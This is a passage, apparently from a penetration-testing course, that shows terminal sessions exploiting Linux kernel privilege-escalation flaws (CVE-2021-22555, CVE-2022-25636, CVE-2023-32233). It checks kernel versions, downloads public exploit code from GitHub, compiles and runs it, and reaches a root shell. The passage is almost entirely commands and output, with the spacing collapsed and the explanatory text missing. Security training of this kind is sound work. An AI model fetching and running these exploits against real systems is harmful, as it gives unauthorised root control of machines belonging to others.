...
```
`cry0l1t3@ubuntu:~$uname-r5.10.5-051005-generic`
```

```
`cry0l1t3@ubuntu:~$wgethttps://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.ccry0l1t3@ubuntu:~$gcc -m32 -static exploit.c -o exploitcry0l1t3@ubuntu:~$./exploit[+] Linux Privilege Escalation by theflow@ - 2021
...
...SNIP...root@ubuntu:/home/cry0l1t3#iduid=0(root) gid=0(root) groups=0(root)`
```
...
```
`cry0l1t3@ubuntu:~$uname-r5.13.0-051300-generic`
```
...
```
`cry0l1t3@ubuntu:~$gitclone https://github.com/Bonfee/CVE-2022-25636.gitcry0l1t3@ubuntu:~$cdCVE-2022-25636cry0l1t3@ubuntu:~$makecry0l1t3@ubuntu:~$./exploit[*] STEP 1: Leak child and parent net_device
...
[*] STEP 6: rop :)#iduid=0(root) gid=0(root) groups=0(root)`
```
...
```
`cry0l1t3@ubuntu:~$gitclone https://github.com/Liuk3r/CVE-2023-32233cry0l1t3@ubuntu:~$cdCVE-2023-32233cry0l1t3@ubuntu:~/CVE-2023-32233$gcc -Wall -o exploit exploit.c -lmnl -lnftnl`
```

#### Exploitation

```
`cry0l1t3@ubuntu:~/CVE-2023-32233$./exploit[*] Netfilter UAF exploit
...
[*] You've Got ROOT:-)#iduid=0(root) gid=0(root) groups=0(root)`
```
